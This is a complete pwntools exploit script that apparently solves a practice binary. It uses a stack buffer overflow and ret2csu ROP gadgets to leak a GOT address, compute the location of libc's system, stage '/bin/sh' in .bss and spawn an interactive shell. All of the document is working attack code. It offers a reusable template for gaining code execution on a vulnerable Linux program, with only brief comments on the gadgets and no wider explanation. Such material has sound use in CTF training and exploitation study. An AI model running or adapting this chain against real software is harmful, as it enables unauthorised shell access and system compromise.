#!/usr/bin/python 
#coding: utf-8
__author__ = "TaQini"
from pwn import *

# load program
p = process('code')

# get info from ELF
elf = ELF('code')
libc = ELF('libc.so.6')

# infomation
bss = elf.symbols['__bss_start']
log.info("bss start at: " + hex(bss))

read_got = elf.symbols['got.read']
log.info("read_got: " + hex(read_got))

write_got = elf.symbols['got.write']
log.info("write_got: " + hex(write_got))

main = elf.symbols['main']
log.info("main @ " + hex(main))

write_libc = libc.symbols['write']
log.info("write@libc: " + hex(write_libc))

system_libc = libc.symbols['system']
log.info("system@libc: " + hex(system_libc))
log.info("")
log.info("")

# overflow point
buflen = 136

# gadgets
# 400610:       4c 89 ea                mov    rdx,r13
# 400613:       4c 89 f6                mov    rsi,r14
# 400616:       44 89 ff                mov    edi,r15
# 400619:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
# 40061d:       48 83 c3 01             add    rbx,0x1
# 400621:       48 39 eb                cmp    rbx,rbp
# 400624:       75 ea                   jne    400610 <__libc_csu_init+0x40>
# 400626:       48 83 c4 08             add    rsp,0x8
mmmcall = 0x400610
# 40062a:       5b                      pop    rbx
# 40062b:       5d                      pop    rbp
# 40062c:       41 5c                   pop    r12
# 40062e:       41 5d                   pop    r13
# 400630:       41 5e                   pop    r14
# 400632:       41 5f                   pop    r15
# 400634:       c3                      ret    
ppppppr = 0x40062a

# junkcode
padding = 0xdeadbeef

# function1
# read(1, write_got, 8)   
payload1 = ""
payload1 += "\x00" * buflen
payload1 += p64(ppppppr) 
rbx = 0
rbp = 1
r12 = write_got         # call   QWORD PTR [r12+rbx*8]
r13 = 8                 # mov    rdx,r13
r14 = write_got         # mov    rsi,r14
r15 = 1                 # mov    edi,r15
ret = mmmcall
payload1 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)

ret = main
payload1 += p64(padding) * 7 + p64(ret) # add rsp,0x8 ;pop 6 reg

log.info("recv[1]: " + p.recvuntil('Hello, World\n'))
sleep(1)

p.sendline(payload1)
log.info("##################-payload-1--sended!---biu~")

##debug
#p.interactive()
#exit(0)
##debug
# \x00�O#e\x7f\x00\x00Hello, World

data = p.recv(8)
log.info("Got write address! data = " + data)

write = u64(data)
log.info("write address: " + hex(write))

log.info("--- Calculating system address ---")
# system - system_libc = write - write_libc
system = write - write_libc + system_libc
log.info("system address: " + hex(system))

##debug
#p.interactive()
#exit(0)
##debug
log.info("Congratulation! level[1] pass! :)")
log.info("")
log.info("")

# function2
# write(0, bss, 16)       # bss: system_addr(8) +  '/bin/sh\0'(8)
payload2 = ""
payload2 += "\x00" * buflen
payload2 += p64(ppppppr)
rbx = 0
rbp = 1
r12 = read_got           # call   QWORD PTR [r12+rbx*8]
r13 = 16                 # mov    rdx,r13
r14 = bss                # mov    rsi,r14
r15 = 0                  # mov    edi,r15
ret = mmmcall
payload2 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)

ret = main
payload2 += p64(padding) * 7 + p64(ret) # add rsp,0x8; pop 6 regs

log.info("recv[2]: " + p.recvuntil('Hello, World\n'))
sleep(2)

p.sendline(payload2)
log.info("##################-payload-2--sended!---biu~")

p.send(p64(system) + '/bin/sh\0')
log.info("system_addr + '/bin/sh\\0' sended!")

##debug
#p.interactive()
#exit(0)
##debug
log.info("Congratulation! level[2] pass! :)")
log.info("")
log.info("")


# function check
# read(1, bss, 16)   
payload1 = ""
payload1 += "\x00" * buflen
payload1 += p64(ppppppr)
rbx = 0
rbp = 1
r12 = write_got         # call   QWORD PTR [r12+rbx*8]
r13 = 16                # mov    rdx,r13
r14 = bss               # mov    rsi,r14
r15 = 1                 # mov    edi,r15
ret = mmmcall
payload1 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)

ret = main
payload1 += p64(padding) * 7 + p64(ret) # add rsp,0x8 ;pop 6 reg

log.info("recv[*]: " + p.recvuntil('Hello, World\n'))
sleep(2)

p.sendline(payload1)
log.info("##################-debug-payload--sended!---biu~")

data1 = p.recv(8)
data2 = p.recv(8)
log.info("Got debug info! data = " + data1 + data2)
log.info("system -- " + hex(u64(data1)))
log.info("binsh -- " + data2)

##debug
#p.interactive()
#exit(0)
##debug
log.info("Nothing worng! Check finished. go ahead!")
log.info("")
log.info("")

# function3
# system('/bin/sh\0')     # bss(bss+8)
payload3 = ""
payload3 += "\x00" * buflen
payload3 += p64(ppppppr)
rbx = 0
rbp = 1 
r12 = bss                # call   QWORD PTR [r12+rbx*8]
r13 = bss+8              # mov    rdx,r13
r14 = bss+8              # mov    rsi,r14
r15 = bss+8              # mov    edi,r15
ret = mmmcall
payload3 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)
ret = main               # don't need return
payload3 += p64(padding) * 7 + p64(ret)

log.info("recv[3]: " + p.recvuntil('Hello, World\n'))
sleep(3)

p.sendline(payload3)
log.info("##################-payload-3--sended!---biu~")

##debug
#p.interactive()
#exit(0)
##debug
log.info("Congratulation! level[3] pass! :)")
log.info("You WIN The Game!")
log.info("Here is the shell you create~ :")

p.interactive()


